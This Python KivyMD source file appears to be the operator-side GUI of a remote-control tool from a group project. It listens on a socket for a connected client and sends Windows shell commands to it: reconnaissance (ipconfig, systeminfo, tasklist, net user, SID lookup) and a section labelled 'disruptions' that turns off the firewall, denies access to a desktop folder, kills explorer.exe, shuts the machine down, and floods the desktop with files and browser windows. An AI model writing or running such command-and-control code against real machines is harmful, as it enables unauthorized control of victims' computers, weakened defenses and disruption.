import os
import socket
import threading

import kivy
import kivymd
from kivymd.app import MDApp
from kivy.lang import Builder
from kivymd.uix.screen import Screen

KV = '''
ScreenManager:
    id: screenManager
    MDScreen:
        name: "startMenu"
        MDRectangleFlatButton:
            id: startBtn
            text: "Start Server"
            pos_hint: {"center_x": .5, "center_y": .5}
            opacity: 1
            disabled: False
            on_press: app.StartServer()
            
        MDLabel:
            id: statusLbl
            text: "Status"
            font_size: '22.5sp'
            halign: 'center'
            size_hint_y: None
            height: self.texture_size[1]
            padding_y: "500"
            
    MDScreen:
        name: "mainMenu"
        MDTextField:
            id: consoleField
            hint_text: 'Console'
            multiline: True
            
        MDGridLayout:
            adaptive_height: True
            pos_hint: {"center_x": 0.9, "center_y": 0.5}
            orientation: 'lr-tb'
            spacing: 10
            cols: 2
            
            MDRectangleFlatButton:
                id: networkInfoBtn
                text: "Network Info"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.NetworkInfo()

            MDRectangleFlatButton:
                id: osInfoBtn
                text: "OS Info"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.OSInfo()
                
            MDRectangleFlatButton:
                id: cpuBtn
                text: "CPU Usage"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.CpuUsage()
                
            MDRectangleFlatButton:
                id: taskBtn
                text: "Task List"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.Tasks()
                
            MDRectangleFlatButton:
                id: netserviceBtn
                text: "Network Services"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.Services()
                
            MDRectangleFlatButton:
                id: userInfoBtn
                text: "User Information"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.UserInfo()
                
            MDRectangleFlatButton:
                id: fileCreateBtn
                text: "File Creation Disruption"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.FileCreate()
                
            MDRectangleFlatButton:
                id: firewallBtn
                text: "Firewall"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.Firewall()
                
            MDRectangleFlatButton:
                id: shutDownBtn
                text: "Shutdown"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.Shutdown()
                
            MDRectangleFlatButton:
                id: killTaskBtn
                text: "Kill Task"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.KillTask()
                
            MDRectangleFlatButton:
                id: denyFileBtn
                text: "Deny Files"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.DenyFiles()

            MDRectangleFlatButton:
                id: openBrowser
                text: "Open Browser"
                pos_hint: {"center_x": .5, "center_y": .5}
                opacity: 1
                disabled: False
                on_press: app.OpenBrowser()
'''

class Main(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "BlueGray"

        return Builder.load_string(KV)

    def StartServer(self):
        # Server IP and Port
        HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
        PORT = 21420

        # Start server with the given host and port given and listen for a client
        self.server = socket.socket()
        self.server.bind((HOST, PORT))
        self.root.ids.statusLbl.text = 'Server started!'
        # print('Server started!')

        # A max of one client can be listend at a time
        self.server.listen(1)
        self.root.ids.statusLbl.text = 'Listening for a client connection to be established...'
        # print('Listening for a client connection to be established...')
        self.root.ids.startBtn.disabled = True
        self.root.ids.startBtn.opacity = 0
        threading.Thread(target=self.MainLoop).start()

    def MainLoop(self):
        while True:
            # Check whether connection is established
            self.currConn = self.server.accept()[0]
            self.root.ids.statusLbl.text = 'A client connected!'
            self.root.current = "mainMenu"
            print('A client has established connection!')

    # Juls shizzle
    # This is to gather the client's information about their network
    def NetworkInfo(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            # Send command to the client
            command = 'ipconfig /all'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # Receive the output given from the client
            output = self.currConn.recv(8096).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    #Gather Operating System Information
    def OSInfo(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            #Get OS Information
            command = 'systeminfo | findstr /C:"OS"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            output = self.currConn.recv(8096).decode()

            command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            output2 = self.currConn.recv(8096).decode()

            #Print results
            
            print('Output: \n')
            print(output)
            print(output2)
            break

    # Zees stuff
    #Get the % of CPU Utilization
    def CpuUsage(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            command = 'wmic cpu get loadpercentage'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            output = self.currConn.recv(8096).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    #Get current running tasks
    def Tasks(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            # Send command to client
            command = 'tasklist'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # Receive output from client
            output = self.currConn.recv(20480).decode()  # Still needs more buffer
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    #Get current running services
    def Services(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            command = 'net start'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            output = self.currConn.recv(8096).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Fang's stuffz
    def UserInfo(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            # Get Username, Fullname, Last Login
            command = 'net user "%USERNAME%"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            output = self.currConn.recv(8096).decode()
            output = output.splitlines()

            # Get SID
            command = 'wmic useraccount where name="%USERNAME%" get sid'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            output2 = self.currConn.recv(8096).decode()
            output2 = output2.splitlines()

            # Print results
            print('Output: ')
            print(f"{output[0]}\n{output[1]}\n{output[8]}")
            print(f"SID\t\t\t\t\t\t\t{output2[2]}")
            break

    ###############################DISRUPTIONS############################################
    #Juls Simple Disruption
    #Disable Firewall Disruption
    def Firewall(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            command = "netsh advfirewall set allprofiles state off"
            self.currConn.send(command.encode())
            print('[+] Command sent')
            output = self.currConn.recv(1024).decode()
            print(f"Output: {output}")
            self.root.ids.consoleField.text = output
            break

    def DenyFiles(self):
        while True:
            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:n'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            
            output = self.currConn.recv(1024).decode()
            print('Output: ', output)
            break

    #Juls Severe Disruption
    def OpenBrowser(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            command = 'FOR /L %A IN (1 1 20) DO (start msedge)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            self.root.ids.consoleField.text = command
            break

    #Zees Severe Disruption
    # File Creation Disruption
    def FileCreate(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            self.root.ids.consoleField.text = command
            break

    #Zees Simple Disruptions
    #Shutdown Disruption
    def Shutdown(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            #/t is Timer
            command = 'shutdown /s /t 00'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            self.root.ids.consoleField.text = command
            break

    def KillTask(self):
        while True:
            #Reset console
            self.root.ids.consoleField.text = ''
            
            #procname = input('Enter Process Name: ')
            command = 'taskkill /im explorer.exe /F'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            output = self.currConn.recv(8096).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

if __name__ == '__main__':
    Main().run()
